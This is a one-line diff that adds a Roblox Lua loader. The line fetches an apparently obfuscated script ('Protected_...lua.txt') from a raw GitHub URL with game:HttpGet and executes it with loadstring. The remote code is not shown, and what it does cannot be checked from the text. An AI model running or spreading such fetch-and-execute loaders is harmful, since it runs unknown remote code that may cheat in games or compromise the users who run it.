@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kei-0-zen/Testtkakakak/fb62045e94e57c71f01ce79191abf9c66568ab39/Protected_6626501753741720.lua.txt"))()
